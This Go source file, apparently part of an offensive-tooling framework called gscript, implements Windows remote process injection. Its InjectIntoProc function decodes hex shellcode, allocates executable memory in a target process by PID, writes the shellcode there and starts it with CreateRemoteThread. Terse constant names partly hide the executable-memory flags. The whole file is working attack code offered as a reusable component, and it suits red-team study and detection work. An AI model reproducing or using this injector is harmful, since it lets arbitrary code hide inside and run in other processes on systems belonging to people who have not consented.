// +build windows

package gscript

import (
	"encoding/hex"
	"errors"
	"syscall"
	"unsafe"
)

const (
	wmc  = 0x1000
	wmr  = 0x2000
	wam  = 0x40
	wpc  = 0x0002
	wpq  = 0x0400
	wpo  = 0x0008
	wpw  = 0x0020
	wpr  = 0x0010
	zero = 0
)

var (
	kernel       = syscall.NewLazyDLL("kernel32.dll")
	valloc       = kernel.NewProc("VirtualAlloc")
	openProc     = kernel.NewProc("OpenProcess")
	writeProc    = kernel.NewProc("WriteProcessMemory")
	allocExMem   = kernel.NewProc("VirtualAllocEx")
	createThread = kernel.NewProc("CreateRemoteThread")
)

func allocate(size uintptr) (uintptr, error) {
	addr, _, _ := valloc.Call(0, size, wmr|wmc, wam)
	if addr == 0 {
		return 0, errors.New("could not allocate memory")
	}
	return addr, nil
}

func InjectIntoProc(shellcode string, pid int64) error {
	sc, err := hex.DecodeString(shellcode)
	if err != nil {
		return errors.New("conversion from hex-encoded string failed")
	}

	scAddr, err := allocate(uintptr(len(sc)))
	if err != nil {
		return err
	}

	addrPtr := (*[990000]byte)(unsafe.Pointer(scAddr))
	for scIdx, scByte := range sc {
		addrPtr[scIdx] = scByte
	}

	remoteProc, _, _ := openProc.Call(wpc|wpq|wpo|wpw|wpr, uintptr(zero), uintptr(pid))
	remoteMem, _, _ := allocExMem.Call(remoteProc, uintptr(zero), uintptr(len(sc)), wmr|wmc, wam)
	writeProc.Call(remoteProc, remoteMem, scAddr, uintptr(len(sc)), uintptr(zero))
	status, _, _ := createThread.Call(remoteProc, uintptr(zero), 0, remoteMem, uintptr(zero), 0, uintptr(zero))
	if status != 0 {
		return nil
	}

	return errors.New("could not inject into given process")
}
